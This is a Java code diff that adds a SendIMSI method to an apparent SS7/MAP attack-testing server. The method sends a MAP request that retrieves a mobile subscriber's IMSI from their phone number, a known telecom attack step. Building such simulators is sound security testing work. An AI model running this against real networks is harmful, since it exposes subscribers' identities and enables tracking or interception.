@@ -1388,6 +1388,25 @@ public class TestAttackServer extends AttackTesterBase implements Stoppable, MAP
 
     }
 
+    public void performSendIMSI(ISDNAddressString msisdn) {
+        MAPProvider mapProvider = this.mapMan.getMAPStack().getMAPProvider();
+        MAPParameterFactory parameterFactory = mapProvider.getMAPParameterFactory();
+
+        MAPApplicationContext applicationContext = MAPApplicationContext.getInstance(MAPApplicationContextName.imsiRetrievalContext, MAPApplicationContextVersion.version2);
+        try {
+            MAPDialogOam curDialog = mapProvider.getMAPServiceOam().createNewDialog(applicationContext,
+                    this.mapMan.createOrigAddress(),
+                    null,
+                    this.mapMan.createDestAddress(),
+                    null);
+
+            curDialog.addSendImsiRequest(msisdn);
+            curDialog.send();
+        } catch (MAPException ex) {
+            System.out.println("Error when sending SendIMSI Req: " + ex.toString());
+        }
+    }
+
     @Override
     public void onRegisterSSRequest(RegisterSSRequest request) {
 
